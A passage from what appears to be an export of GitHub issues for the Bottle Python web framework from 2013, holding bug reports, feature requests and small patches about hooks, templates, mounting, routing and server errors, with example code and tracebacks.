While the routes work as expected, the hooks `before_request` and `after_request` (using the default `HooksPlugin` that is initialized in `Bottle.__init__()`) do not fire if the route is handled by a different app.
For me, such behaviour is unwanted and I would expect that hooks get fired regardless of the handling app. Therefore, I would propose, that the `merge()` method would also merge hooks.
"
523,debug mode is being dropped (or I just can't detect it correctly),2013-07-09T10:23:57Z,,,,,"Despite running:

```
bottle.debug(True)
bottle.run()
```

I find that the app is still later put into non-debug mode and I can't figure out why. Here is a very simple example of the behaviour:

```
from bottle import route, validate, error
import bottle

welcome_template = """"""
<!DOCTYPE>
<html>
<head></head>
<body>
<h1>Debug simplest example</h1>
% if my_debug:
  Yes we're in debug mode
% else:
  No we're not in debug mode
% end
</body>
</html>
""""""

@route('/')
def welcome():
  print (""In welcome "" + str(bottle.DEBUG))
  return bottle.template(welcome_template, my_debug=bottle.DEBUG)

if __name__ == '__main__':
  bottle.debug(True)
  bottle.run(port=8080)
```

If you run this you will find that ""In welcome False"" is printed and the welcome page claims to not be in debug mode.
"
522,If %include and %rebase are to be functions...,2013-07-06T22:51:28Z,2013-08-26T21:28:17Z,,,,"...what is the correct way to do:

```
cat layout.tpl
<h1>{{title}}</h1>
<div id=""main"" class=""ink-grid"">
        %include
</div>

cat variant.tpl
{{!data}}
%rebase('layout', title=title)
```

I keep getting a DeprecationWarning on that %include, and the docs for 0.12-dev aren't updated with the proper syntax.
"
521,rebasing to templates defined as a string.,2013-07-04T13:32:58Z,,,,,"Currently one can do:

```
welcome_template = """"""<h1> Welcome</h1>""
...
return bottle.template(welcome_template, ...)
```

and all works fine. However it would be nice to be able to do:

```
root_template = """"""<html><head></head><body>
%include
</body></html>""""""

welcome_template """"""<h1> Welcome </h1>
%rebase root_template title=""Hello""
""""""
...
return bottle.template(welcome_template, ...)
```

But you cannot do that since root_template will not be found. So you're forced to put root_template into a file root_template.tpl
"
520,Bottle app does not work after mount,2013-07-01T15:24:20Z,2013-09-05T12:04:39Z,,,,"Consider the following code:

``` python
from bottle import Bottle, request, response, HTTPError

root_app = Bottle()
home_app = Bottle()
param_app = Bottle()

PREFIX_PARAM   = 'params'

HOME_OBJ = {
    PREFIX_PARAM: 'Service parameters',
}

PARAM_OBJ = {
    'p1': 'Testing param',
}


@home_app.get('/')
def home_list():
    return HOME_OBJ

@param_app.get('/')
@param_app.get('/<oid>')
def param_list(oid=None):
    print '*** param list (%s)' % oid
    if oid is not None and oid not in PARAM_OBJ:
        raise HTTPError(status=404)
    return PARAM_OBJ



path_prefix = '/app'
#path_prefix = '/'
if path_prefix and len(path_prefix) > 0:
    p = path_prefix.strip(' /')
    if len(p) > 0:
        p = '/%s' % p
    else:
        p = ''
else:
    p = ''
print 'Path prefix is [%s]' % p
if len(p) == 0 or p == '/':
    root_app.merge(home_app)
else:
    root_app.mount(p, home_app)
root_app.mount('%s/%s' % (p, PREFIX_PARAM), param_app)
root_app.run(host='localhost', port=8080)
```

I perform the following requests (using httpie https://github.com/jkbr/httpie):

``` http
host~ # http GET localhost:8080/app
HTTP/1.0 200 OK
Content-Length: 32
Content-Type: application/json
Date: Mon, 01 Jul 2013 15:12:46 GMT
Server: WSGIServer/0.1 Python/2.7.3

{
    ""params"": ""Service parameters""
}
```

``` http
host~ # http GET localhost:8080/app/params
HTTP/1.0 200 OK
Content-Length: 23
Content-Type: application/json
Date: Mon, 01 Jul 2013 15:14:08 GMT
Server: WSGIServer/0.1 Python/2.7.3

{
    ""p1"": ""Testing param""
}
```

``` http
host~ # http GET localhost:8080/app/params/p1
HTTP/1.0 404 Not Found
Content-Length: 742
Content-Type: text/html; charset=UTF-8
Date: Mon, 01 Jul 2013 15:14:42 GMT
Server: WSGIServer/0.1 Python/2.7.3

<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
    <html>
        <head>
            <title>Error: 404 Not Found</title>
            <style type=""text/css"">
              html {background-color: #eee; font-family: sans;}
              body {background-color: #fff; border: 1px solid #ddd;
                    padding: 15px; margin: 15px;}
              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}
            </style>
        </head>
        <body>
            <h1>Error: 404 Not Found</h1>
            <p>Sorry, the requested URL <tt>&#039;http://localhost:8080/app/params/p1&#039;</tt>
               caused an error:</p>
            <pre>Not found: &#039;/params/p1&#039;</pre>
        </body>
    </html>
```

The last request fails to match the rule `@param_app.get('/<oid>')`.
Any clue why this is happening? Is this a `mount(...)` bug?

Also, if I use `path_prefix = '/'` (in this case, `root_app.merge()` is used), and perform the same requests (with the correct URLs) the last call succeeds.
"
519,doc typo fix,2013-06-26T09:29:38Z,2013-06-26T11:58:08Z,,,,"Oher --> Other
"
518,Route ordering similar to werkzeug,2013-06-25T19:22:11Z,,,,,"Since you merged my last pull request, whose main purpose was to ease implementation of route ordering based on any priority algorithm, I propose a sorting algorithm based on werkzeug's one.

The precise algorithm used by werkzeug is hard to find. But it still has some documentation in the code, in werkzeug.routing.Route.match_compare_key.

The ordering is the following:
- static routes always have top priority (that was already the case in bottle)
- for dynamic routes, the more complex it is the more priority it has
- for routes with the same complexity, it compares the different parts in the route from left to right. Static parts always have an higher priority. The only difference with werkzeug is that, in werkzeug, some type of dynamic patterns have more priority than others (ie: integer has more than path), but I didn't think it was really necessary to implement that.

Even if you don't like the idea to switch to an auto-ordering mode for routes, I think it would still be a good idea to implement it as an option in the Router class.
"
517,New code block template syntax conflicts with underscore.js syntax,2013-06-24T13:40:33Z,,,SyntaxError,SyntaxError: invalid syntax,"In Bottle 0.12-dev, rendering template which has line beginning with '<%' is producing SyntaxError . At least in 0.11.3, problem was not present.
'<%= %>' is syntax for Underscore templates.

```
>>> bottle.__version__
'0.12-dev'
>>> from bottle import SimpleTemplate
>>> tpl = SimpleTemplate('<%=bla %>')
>>> tpl.render()
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""bottle.py"", line 3131, in render
    self.execute(stdout, env)
  File ""bottle.py"", line 3118, in execute
    eval(self.co, env)
  File ""bottle.py"", line 184, in __get__
    value = obj.__dict__[self.func.__name__] = self.func(obj)
  File ""bottle.py"", line 3085, in co
    return compile(self.code, self.filename or '<string>', 'exec')
  File ""<string>"", line 1
    =bla
    ^
SyntaxError: invalid syntax
```
"
516,Input with prompt or anything else?,2013-06-23T06:13:30Z,2013-06-23T14:35:02Z,,,,"Guys. I can't find the way to input values. 

for idx, d in enumerate(student):
        for ids, s in enumerate(student):
            if d['Name'] == s['Name'] and idx != ids:
                print d,idx
                l=raw_input('input number to delete')
                student.pop(int(l))
    for m in student:
    for k in olympiad:
      if m['Name']==k['Name']:
                this.append(k)

can i somehow read 'l' variable using javascript prompt or using get(it may use to make 5 get's) 
"
515,Not good regex(?),2013-06-22T14:45:38Z,2013-06-22T16:02:45Z,,,,"Although the `_re_flatten` works well but I think there is something not good. Actually `(?P<>abc)` is not a right regex but it seems `_re_flatten` just treats it like it is right. So I think `+` is better than `*`.
"
514,after_request hook is not activated on redirect or error,2013-06-19T14:17:08Z,2013-06-21T18:37:28Z,,,,"Test app:

```
import bottle


@bottle.route('/')
def index():
    return '<a href=""/1"">next</a>'

@bottle.route('/1')
def page1():
    return bottle.redirect('/2')

@bottle.route('/2')
def page2():
    raise Exception

@bottle.hook('before_request')
def before():
    print('BEFORE REQUEST')

@bottle.hook('after_request')
def after():
    print('AFTER REQUEST')

if __name__ == '__main__':
    app = bottle.default_app()
    bottle.run(app, host='127.0.0.1', port=8080)
```

after_request hook only works in ""index"" route.
I think it should work in all three cases.
"
513,simple template reg ex's break with windows line endings,2013-06-18T23:21:33Z,2013-06-21T14:24:28Z,Bug,,,"tried migrating my 0.11.6 app to 0.12-dev..

version: 12-dev
env: python 2.7.5 x86 / Windows 8 x64

```
from bottle import route, run, template

@route('/ok')
def index():
    d = { 'test': [ 1, 2, 3 ] }
    return template('%for ea in test:\n<li>{{ea}}</li>\n%end\n', d)

@route('/alsook')
def index():
    d = { 'test': [ 1, 2, 3 ] }
    return template('%for ea in test:\r\n<li>{{ea}}</li>\r\n%end\n', d)

@route('/broken')
def index():
    d = { 'test': [ 1, 2, 3 ] }
    return template('%for ea in test:\n<li>{{ea}}</li>\n%end\r\n', d)

def main():
    run(host='0.0.0.0', port=7070, debug=True)
```

I tried to step through the StplParser code, but I have no idea when it comes to regular expressions, it's a black art to me. With windows line endings, the named matching doesn't pick up the end block, but instead detects a code block with the value 'end\r', which results in an 'end' statement winding up in the generated code, and results in  NameError(""name 'end' is not defined"",)

You can do a bodge like SimpleTemplate.defaults['end'] = None, which seems to get it to work, but I'm not sure of the ramifications of that. I had more problems once I tried to do that, but that's to do with deprecated rebase/include statements now being functions etc which I won't go into.
"
512,Improvements to Router to allow Werkzeug-like route priorities,2013-06-16T12:59:12Z,2013-06-17T18:51:53Z,,,,"This pull request is an example for a discussion in the bottle mailing list.
See here: https://groups.google.com/forum/#!topic/bottlepy/CVDaEeGa1No
"
511,403 Response is not working,2013-06-11T11:15:34Z,,Bug,,,"I am trying to build a 403 Response after some html validation that I do. I do it like this:
Response(body='', status=403, headers=headers)
but what I get back is a 200 OK response. 
I did some debugging on bottle.py and I saw that Response object is called twice. The first time gives a 200 status, then goes through the validation and then gives back a 403 status. Any idea why is this happening?
Any help will be truly appreciated
Thanks
P.
"
510,"post_request hook: how to get the error traceback message, ",2013-06-08T08:05:34Z,2013-06-08T08:10:14Z,,,,"```
def post_request(worker, req, environ, resp):
    pass
```

how can i get traceback message ?
"
509,Small grammar fixes.,2013-06-07T06:52:24Z,2013-07-28T17:21:58Z,,,,
508,@view decorator interacts poorly with sqlite plugin and possibly others,2013-06-06T22:35:23Z,,,,,"for example, using the the sqlite plugin like so:

```
@get('/')
@view('index')
def index(db):
    return { 'users': db.execute('select * from users').fetchall() }
```

I haven't quite got to the bottom of this yet, but when the view decorator is used, the call to inspect.getargspec inside the sqlite plugin (or any plugin utilising the inspect module?) returns an empty list, and not [ 'db' ] as expected, which means that a database object is never passed to the index function.

work around is to not combine @view with sqlite plugin magic:

```
@get('/')
def index(db):
    return template('index', { 'users': db.execute('select * from users').fetchall() })
```

python version: 2.7.3
platform: Windows 8 x64
"
507,Modified: Change from ISO-8859-1 to latin1.,2013-06-05T12:21:24Z,2013-06-05T12:37:40Z,,,,"I unify encoding to latin1.

ISO-8859-1 is actually alias latin1.
Change to avoid a misunderstanding. 
"
506,Coerce Expires header to be RFC 1123 compliant,2013-06-03T21:41:18Z,2013-06-03T21:44:05Z,,,,"...if given an int or datetime.date[time]
"
505,Coerce Expires header to be RFC 1123 compliant,2013-06-03T21:24:21Z,2013-06-03T21:43:44Z,,,,"...if given an int or datetime.date[time]
"
504,HTTP HEAD Content-Length header returns zero on Python 2.6,2013-06-03T18:18:16Z,,,,,"Pretty simple code

@route('/static/filename:path')
def send_static(filename):
    return static_file(filename, root='static')

curl -I http://my.server.here/static/images/1.jpg
HTTP/1.0 200 OK
Date: Mon, 03 Jun 2013 18:15:04 GMT
Server: WSGIServer/0.1 Python/2.6.5
Last-Modified: Thu, 23 May 2013 21:09:12 GMT
Content-Type: image/jpeg
Accept-Ranges: bytes
Content-Length: 0

Inserted a print call at the end of static_file and Content-Length is set properly as it should be before the return.

Edit: Removed ""static file"" from title since it doesn't seem to just be static files
"
503,Updated url to new <variable> syntax,2013-06-03T05:04:10Z,2013-06-04T21:56:55Z,,,,
502,error by using try except with redirect(),2013-06-02T18:14:51Z,2013-06-03T05:16:10Z,,,,"if i use try except i get an error. without it works.

```
from bottle import route, template, static_file, error, request, response, redirect, default_app, run, debug, HTTPResponse
import sys
import traceback

@route('/test')
def test():
    try:
        redirect('/')
    except:
        traceback.print_exc(file=sys.stdout)
```

Traceback (most recent call last):
  File ""satzgenerator.py"", line 165, in test
    redirect('/')
  File ""/Users/davidak/Dropbox/satzgenerator/bottle.py"", line 2053, in redirect
    raise res
bottle.HTTPResponse
10.0.0.11 - - [02/Jun/2013 20:09:21] ""GET /test HTTP/1.1"" 200 0

i get a white page and don't get redirected.

i am using bottle 0.11.6
"
501,urllib.parse.quote in the address,2013-06-01T13:07:27Z,2013-12-04T09:36:19Z,,,,"When the encoding part of the address are displayed incorrect symbols:

<pre><code>@oute('/admin/:category', method=['GET', 'POST'])
def items_movies(db, category):
    return category</code></pre>

and return ""ÑÐµÑÑ"" to the url http://127.0.0.1:8082/admin/%D1%82%D0%B5%D1%81%D1%82 instead ""тест"".
"
500,Human Brain + defined + get + setdefault,2013-05-31T06:56:43Z,,,,,"I just wanted to posit an optional change for future versions of bottle. Instead of having 3 very different names for related functions (defined + get + setdefault), I would suggest a change to 3 similar names for these related functions.

An option might be: vardef + varset + varget

A person new to bottle would more easily remember the similar name syntax. If this change is accepted, the new functions could readily be used alongside the old ones, and the old functions slowly deprecated.
"
499,Support for JSON POST data,2013-05-21T05:11:19Z,2013-05-22T15:49:34Z,,,,"Hello,

AngularJS (and I assume many other frameworks too) forms post requests sending data JSON encoded, instead of the usual parameter-encoding.

Sending data as JSON allows for richer data exchange, and I think it would be a nice addition to Bottle. Currently Bottle doesn't translate the JSON into its special request.POST object.

The problem is described in detail here : http://stackoverflow.com/questions/10520174/seding-data-from-angularjs-to-django (the post refers to Django but it also applies to Bottle).

So, @defnull do you think it's a nice idea to try to parse JSON POST data ?

Thanks, 
"
498,Updated url variable syntax.,2013-05-15T05:20:03Z,2013-05-30T15:53:52Z,,,,
497,Example application default args not working on Windows?,2013-05-13T09:14:26Z,2013-12-04T10:18:06Z,,,,"```
from bottle import route, run, template

@route('/hello/:name')
def index(name='World'):
    return template('<b>Hello {{name}}</b>!', name=name)

run(host='localhost', port=8000)
```

Here it is with no arguments (also tried without trailing `/`):

```
E:\>curl -X GET localhost:8000/hello/ -I
HTTP/1.0 404 Not Found
Date: Mon, 13 May 2013 09:12:46 GMT
Server: WSGIServer/0.1 Python/2.7.4
Content-Length: 732
Content-Type: text/html; charset=UTF-8
```

And with arguments it works as expected:

```
E:\>curl -X GET localhost:8000/hello/a -I
HTTP/1.0 200 OK
Date: Mon, 13 May 2013 09:12:49 GMT
Server: WSGIServer/0.1 Python/2.7.4
Content-Length: 15
Content-Type: text/html; charset=UTF-8
```
"
496,Multipart forms not limited with request size,2013-05-11T06:59:02Z,,,,,"If you try POST request with content type set to ""multipart/"" (ie uploading files), Bottle won't check for size of it.

All of the other code flow use _get_body_string which respects MEMFILE_MAX (with current limit of 100kB).

This can be nontrivial to be fixed for multiple files and considering Content-lenght in headers as not always correct.
"
495,Prefer to use simplejson if it is available,2013-05-06T15:09:03Z,2013-05-09T08:11:53Z,,,,"I've seen simplejson outperform the standard json module at least on Python 2.7.

I figure it probably can't hurt to try to import simplejson first, if it is available, for the added performance boost. This will still fallback to the standard built-in Python json module if simplejson is not available.
"
494,select.error in BaseServer().serve_forever() when receiving a sigUSR1,2013-04-30T09:58:56Z,2013-08-26T21:21:48Z,,select.error,"select.error: (4, 'Interrupted system call')","I need to handle sigusr1 buy myself in a bottle-based application. I caught the signal with a custom handler but nevertheless it prompts me ""shutdown…"" and then crashes with the following trace : 

``` python
Bottle server starting up (using WSGIRefServer())...
Listening on http://127.0.0.1:60200/
Hit Ctrl-C to quit.

Shutdown...
Traceback (most recent call last):
  File ""giomanager.py"", line 41, in <module>
    run( giomanager, port=60200 )
  File ""/usr/lib/python2.7/dist-packages/bottle.py"", line 2389, in run
    server.run(app)
  File ""/usr/lib/python2.7/dist-packages/bottle.py"", line 2087, in run
    srv.serve_forever()
  File ""/usr/lib/python2.7/SocketServer.py"", line 225, in serve_forever
    r, w, e = select.select([self], [], [], poll_interval)
select.error: (4, 'Interrupted system call')
```

I just don't figure out what it wrong.
"
493,Raise exception on failed run()?,2013-04-29T08:30:09Z,2013-05-08T11:46:18Z,,,,"Binding to a port < 1024 is not possible for non-root users as defined by the IANA. This is correctly documented at http://bottlepy.org/docs/dev/deployment.html.

What I'm trying to do is raise an exception if binding the app fails:

```
./rpi-bottle.py -p 80
Bottle v0.12-dev server starting up (using WSGIRefServer())...
Listening on http://0.0.0.0:80/
Hit Ctrl-C to quit.

Traceback (most recent call last):
  File ""/home/sqrt/.../bottle.py"", line 2821, in run
    server.run(app)
  File ""/home/sqrt/.../bottle.py"", line 2506, in run
    srv = make_server(self.host, self.port, handler, **self.options)
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 144, in make_server
    server = server_class((host, port), handler_class)
  File ""/usr/lib/python2.7/SocketServer.py"", line 419, in __init__
    self.server_bind()
  File ""/usr/lib/python2.7/wsgiref/simple_server.py"", line 48, in server_bind
    HTTPServer.server_bind(self)
  File ""/usr/lib/python2.7/BaseHTTPServer.py"", line 108, in server_bind
    SocketServer.TCPServer.server_bind(self)
  File ""/usr/lib/python2.7/SocketServer.py"", line 430, in server_bind
    self.socket.bind(self.server_address)
  File ""/usr/lib/python2.7/socket.py"", line 224, in meth
    return getattr(self._sock,name)(*args)
error: [Errno 13] Permission denied
Bottle v0.12-dev server starting up (using WSGIRefServer())...
Listening on http://0.0.0.0:80/
Hit Ctrl-C to quit.
```

I tried every various combinations of the following snippet

```
try:
    run(reloader=True, host='0.0.0.0', port=80)
except OSError as err:
    print(err)
```

However, it seems that a simple `error` cannot be caught (as opposed to [`BaseException`](http://docs.python.org/2/library/exceptions.html#exceptions.BaseException) and its sub-classes).

Is there any way to catch a failed binding? If not, would it be feasible to have `run()` throw a (catchable) exception?
"
492,mount and wsgi app,2013-04-28T01:11:47Z,,,,,"i tried the following code:

import bottle

def application(environ, start_response):
    start_response('200 OK', [('Content-Type', 'text/plain')])
    yield 'Hello World'

bottle.mount('/test/', application)

bottle.run(debug=True, reloader=True)

but i get an error 500. it appears that generations are executed on access and by the time the return value of the wsgi application is accessed rs.body was assigned to a generator thus start_response in mountpoint_wraper raises an exception that rs.body does not have an attribute append.
"
491,use argparse,2013-04-22T20:58:10Z,,,,,"as optparse is deprecated, shouldn't bottle move to use the new standard argparse ?
"
490,Fixing a syntax error.,2013-04-22T00:10:01Z,2013-04-22T12:56:40Z,,,,"There is a silly syntax error in setup.py.
"
489,Some fixes on tests,2013-04-21T08:19:02Z,2013-04-22T17:29:56Z,,,,"- Fixed wrong named class on test_server.py
- Removed unused imports
- Fixed some PEP8 warnings
"
488,Keep zh_CN doc update-to-date,2013-04-20T09:23:21Z,2013-04-22T15:39:03Z,,,,"Some people asked me for a pdf. I think we should put it to http://bottlepy.org/docs/dev-cn/ for downloading. Later, I may write a tutorial about generating a pdf.
"
487,thread errors when running with paste,2013-04-15T14:52:27Z,,,ValueError,ValueError: invalid thread id,"```
  1 #!/usr/bin/env python2
  2 
  3 import os
  4 from bottle import run, debug, PasteServer
  5 import config
  6 
  7 app_dir = os.path.dirname(__file__)
  8 if app_dir:
  9     os.chdir(app_dir)
 10 
 11 debug(True)
 12 run('app', reloader=True, host=config.listen_host, port=config.listen_port, server=PasteServer)
```

```
2013-04-15 07:20:03,596 - app - DEBUG - refresh_data() start
DEBUG:app:refresh_data() start
Traceback (most recent call last):
  File ""/usr/local/bin/graph-explorer/bottle.py"", line 2699, in run
    server.run(app)
  File ""/usr/local/bin/graph-explorer/bottle.py"", line 2412, in run
    **self.options)
  File ""/usr/local/bin/graph-explorer/paste/httpserver.py"", line 1311, in serve
    server.serve_forever()
  File ""/usr/local/bin/graph-explorer/paste/httpserver.py"", line 1091, in serve_forever
    self.thread_pool.shutdown()
  File ""/usr/local/bin/graph-explorer/paste/httpserver.py"", line 941, in shutdown
    self.kill_worker(worker.thread_id)
  File ""/usr/local/bin/graph-explorer/paste/httpserver.py"", line 721, in kill_worker
    killthread.async_raise(thread_id, SystemExit)
  File ""/usr/local/bin/graph-explorer/paste/util/killthread.py"", line 25, in async_raise
    raise ValueError(""invalid thread id"")
ValueError: invalid thread id
```

i use bottle 0.11.6 and the latest version of paste.

btw, sometimes also the process keeps running but doesn't listen on the port anymore, i.e. making my site unavailable.  i don't know if that's related..
"
486,"Can't access the gettext function ""_()"" in simpleTemplate",2013-04-10T07:14:54Z,,,,,"Look Here:

``` python
% import gettext
% gettext.install('ProgramX') # It will set _ = gettext.gettext in python builtins namespace.

...

{{!_('Translate Me!')}} % # But it failed! _ be occupied by a dict object and it not callable...
```

How could I access the gettext interface ""_""?

The `_.get('__builtins__').get('_')('Translated Me')` really not a good idea... (because `xgettext` program are hard to parse and extract the string which need to be translated, and of course, it too long!) 

Thanks!

About gettext.install():
http://docs.python.org/3.3/library/gettext.html#gettext.install
"
485,I updated setup.py classifiers to show Python 3.2 and 3.3 support.,2013-04-10T00:16:15Z,2013-04-16T20:31:54Z,,,,"I added a couple classifiers to show that Bottle works with Python 3.2 and 3.3. 

tox isn't running tests against 3.0 and 3.1 so I didn't mark them as supported.
"
484,static_file: add charset to content-type,2013-04-09T12:49:31Z,2013-08-25T13:54:42Z,,,,"currently static_file serves content-type as 'text/html' without
providing a charset, which makes firefox bark with this in the error log:

> The character encoding of the HTML document was not declared. The document
> will render with garbled text in some browser configurations if the document
> contains characters from outside the US-ASCII range. The character encoding
> of the page must be declared in the document or in the transfer protocol.

this patch modifies static_file to add ""charset=UTF-8"" to all ""text/..."" mimetypes
in case the mimetype was not provided explicitly. The actual charset used
can be configured via 'autocharset' keyword argument.

Note: I have not actually tested this patch, as I use a stable version.
"
483,remove unused import: urllib,2013-04-09T12:49:01Z,2013-04-16T20:34:12Z,,,,
482,Callback invoked multiple times when using multiple plugins. ,2013-04-08T18:56:29Z,,,,,"I don't know if this is intended plugin behavior: A plugin can invoke a callback directly. When  multiple plugins are associated with a route, this can result in the callback getting invoked more than once. 

It is not clear to me if this is by design. For my needs, I am planning to change the Route code to recursively call all plugins associated with a route while invoking the callback only once.  

I am curious if others are interested in having plugins work in this manner. 
"
481,global defaults for tempalte and callabe dict attributes,2013-04-05T22:26:02Z,2014-04-22T05:58:35Z,,,,
480,callable ConfigDict attributes,2013-04-05T16:59:45Z,2013-04-05T22:25:27Z,,,,"could be used as follow:

app.config.id = lambda: app.config.test + 1

when you call the attribute id it adds 1 to test and returns it.
"
479,Allowed to use route config in this way?,2013-04-03T12:41:12Z,2016-09-25T18:10:47Z,,,,"I was wondering if this is a legal way of using the **config parameter in route? The functionality is very similar for the 4 routes, that's why I'd like to use only one function.

``` python
@app.route('/inc', ajax=False, amount=1)
@app.route('/dec', ajax=False, amount=-1)
@app.route('/ajax/inc', ajax=True, amount=1)
@app.route('/ajax/dec', ajax=True, amount=-1)
def incdec():
    ajax = request['bottle.route'].config['ajax']
    amount = request['bottle.route'].config['amount']
    ...
```
"
478,Enhancements to hooks because after_request hooks are not called after abort() or exception,2013-04-01T21:41:41Z,2013-06-21T18:35:46Z,,,,"I added hook types 'if_exception' and 'if_abort' because hooks defined via 'after_request' aren't called if an exception is raised in a request handler, or abort() is called in a request handler.

I'm not sure if the previous behavior is on purpose. I needed to call a hook after abort()/exception() so I made this change.

Would appreciate if you reviewed, cleaned up and merge this patch.

Thanks for your great work!
"
477,bottle.py import failed when import by .pyw (in windows platform),2013-03-27T05:53:18Z,,,,,"I find a answer in here:

http://stackoverflow.com/questions/2883205/freezing-a-dual-mode-gui-and-console-application-using-cx-freeze?answertab=active#tab-top

Add following code on bottle.py can WORKAROUND this problem (at least in python 3.3).

``` python3
import sys
try:
    sys.stdout.write(""\n"")
    sys.stdout.flush()
# TESTED: Should use AttributeError replace IOError in python 3.3
except AttributeError:
    class dummyStream:
        ''' dummyStream behaves like a stream but does nothing. '''
        def __init__(self): pass
        def write(self,data): pass
        def read(self,data): pass
        def flush(self): pass
        def close(self): pass
    # and now redirect all default streams to this dummyStream:
    sys.stdout = dummyStream()
    sys.stderr = dummyStream()
    sys.stdin = dummyStream()
    sys.__stdout__ = dummyStream()
    sys.__stderr__ = dummyStream()
    sys.__stdin__ = dummyStream()
```

Please consider this problem, very thanks!
"
476,Minor correction. Missing apostrophe.,2013-03-27T00:22:59Z,2013-04-01T15:25:21Z,,,,
475,Minor typo corrections in the development.rst file,2013-03-26T23:52:06Z,2013-04-01T15:25:42Z,,,,
474,Fix a trivial typo in the tutorial,2013-03-26T13:27:35Z,2013-03-26T20:30:01Z,,,,"In the file upload section, change ""unmodified name as _send_ by the client"" to ""unmodified name as _sent_ by the client""
"
473,Add warning when an added route will never be reached,2013-03-22T18:33:09Z,2013-12-19T22:39:59Z,,,,"This pull request addresses a common issue with bottle, described in #452 and probably in other issues too (and mail list). It adds a warning when a route added will never be reached because the call matches other rule, resulting in a 405 error.

Following the decision in other issues, a warning is better than an unexpected behaviour. I decided to not raise an exception to not break existing code.

I know the best solution is handling both routes without a 405 when it is possible, but I know it will change a lot of Router code and probably impact performance a lot.

``` python
>>> import bottle
>>> bottle.get('/<x>')(lambda: 'x')
<function <lambda> at 0x000000000281E7B8>
>>> bottle.get('/<y>')(lambda: 'y')
bottle.py:345: RuntimeWarning: Route shadow (calls to ""GET /<y>"" will match with
 ""GET /<x>"")
  warnings.warn('Route shadow (calls to ""%s %s"" will match with ""%s"")' % (method
, rule, a[1]), RuntimeWarning)
```

I don't know if ""shadow"" is the right name to it.
"
472,"In Todo app tutorial, fix bug and correct some typos and grammar",2013-03-22T08:41:37Z,2013-03-22T12:45:54Z,,,,"The regex `[1-9]+` would reject any number containing a 0 digit. Fixed by changing to `[0-9]+`.
Also corrected a few typos and grammar issues.
"
471,zindex in router to control route matching order,2013-03-14T15:44:38Z,,,,,"Sometimes I want to have a house keeping route without worry that it intercept any futher route assignment.

```
@route('/<name:path>', zindex=-100)
def serve_file(name):
      return template(name, template_lookup=['./web'])
```
"
470,gevent-socketio support added,2013-03-14T15:07:35Z,2013-10-18T15:27:33Z,,,,"Hey ,i have added [gevent-socketio](https://gevent-socketio.readthedocs.org/en/latest/) to bottle . 

Already using it with my Web-App .
"
469,code block for simple template,2013-03-12T16:39:20Z,2013-06-04T22:01:45Z,,,,"Use <%   %> as start /close for multilines code 

and \ to escape to non-code within the block.

Try to compat with stpl3 spec. (may be?)

Also update the test_stpl.py for individual test in windows enviroment that use \r\n .
"
468,Adding circuits.web Server support,2013-03-11T10:08:26Z,,,,,
467,mount with segmented prefix,2013-03-07T19:14:31Z,,,,,"try to support regex that contain '/' like -

```
app.mount(['<:re:admin[^/]*>'],subapp)
```
"
466,Make arguments for sqlite3.connect accessible,2013-02-27T07:49:31Z,2013-12-04T09:43:56Z,,,,"Added an optional keyword argument dict `dbargs` which is passed through to the connect method of the SQLite 3 driver. Now it's possible e.g. to use the `detect_types` parameter for automatically parsing timestamps to datetime objects.

``` python
sqlite.Plugin(dbfile='/path/to/database.db', dbargs={'detect_types': sqlite3.PARSE_DECLTYPES})
```
"
465,Little documentation improvement (?),2013-02-26T23:08:51Z,2013-12-03T16:50:29Z,,,,"putting ""lambda chunk: body.put(chunk)"" makes it feel like there is something misterious going on (are we putting ""chunk"" in some closure or something?).

And I found it difficult to understand without starting or running the worker.
"
464,Minor code fixes and pep8 rules applied,2013-02-25T03:38:14Z,2016-08-28T20:08:52Z,,,,
463,Rethink error handling,2013-02-22T18:16:58Z,,,,,"We have a lot of issues related with error routes, I guess most part of them are because bottle error handling is complicated.

I want to understand if it makes sense to rethink how bottle handle errors.

I will soon catalogue some old issues about error handling questions to provide some data about the problem.
"
462,"A way to ""route"" errors?",2013-02-22T16:09:36Z,,,,,"There is a way to route working pages, but is there a way to get errors routes handled the same way? Currently, as I understand it is possible only using the wrapper function @ error

I would love something like this

``` python
    app.route(path, method, handler, **options)
```

for the errors, like:

``` python
    app.error(code,handler,**options)
```

Is it possible to have this handled this way?
Now I'm writing a kind of configuration file for python project on bottle, but I can't sort out the error handling to be more configurable for users of the app.

I've seen the underlying code, it seems that errors are also being ""registered"" in a handler of their own, so it would be cool to have an error routing function
"
461,Some updates of Chinese tranlation,2013-02-16T18:55:20Z,2013-02-17T13:39:50Z,,,,"Mainly the new 'Request Data' section.

I made a mistake by commiting ""before_request -> before_callback"", it should be ""before_callback -> before_request"".
"
460,Bottle no longer running with Jython,2013-02-13T13:51:57Z,2013-02-13T15:11:52Z,,TypeError,TypeError: Error when calling the metaclass bases,"Bottle was running with version 0.11, the current development version ""'0.12-dev"" seem to drop jython support.

  File ""/path/to/bottle/bottle.py"", line 1989, in <module>
    class _iterchain(itertools.chain):
TypeError: Error when calling the metaclass bases
    reflectedfunction(): expected 1 args; got 3
"
459,add an easy way to act on the wsgi close() method,2013-02-12T15:26:20Z,,Request,,,"In the WSGI Standard there is a close() method defined:

> If the iterable returned by the application has a close() method, the server or gateway must call that method upon completion of the current request, whether the request was completed normally, or terminated early due to an error.
> (http://www.python.org/dev/peps/pep-0333/)

At the moment there is no close method in bottle, so an error is returned. It would be great if bottle would support it somehow like that (e.g. using gevent):

``` python
@route(""/stream"")
def stream():
    while True:
        yield some_thing()
    request.onClose = my_close_handler
```
"
458,let start_response accept 3 arguments with beaker,2013-02-12T13:32:04Z,2013-02-12T13:44:51Z,,,,"When a sub-app decorated by **beaker**, 

there will an error occurred.

Look at the diff.

the origin _start_response_ accept only **2** arguments,

But, beaker call the start_response with **3** arguments.

beaker code:       

``` python
        def session_start_response(status, headers, exc_info=None):              
            if session.accessed():                                               
                session.persist()                                                
                if session.__dict__['_headers']['set_cookie']:                   
                    cookie = session.__dict__['_headers']['cookie_out']          
                    if cookie:                                                   
                        headers.append(('Set-cookie', cookie))                   
            return start_response(status, headers, exc_info)                     
        return self.wrap_app(environ, session_start_response) 
```

Test code:

``` python
import bottle
from beaker.middleware import SessionMiddleware

app = bottle.Bottle()


SESSION_OPTS = {
    'session.type': 'file',
    'session.cookie_expires': 86400,
    'session.data_dir': './session',
    'session.auto': True
}

admin_app = bottle.Bottle()
admin_app_session = SessionMiddleware(admin_app, SESSION_OPTS)

@app.get('/')
def index():
    return 'index'

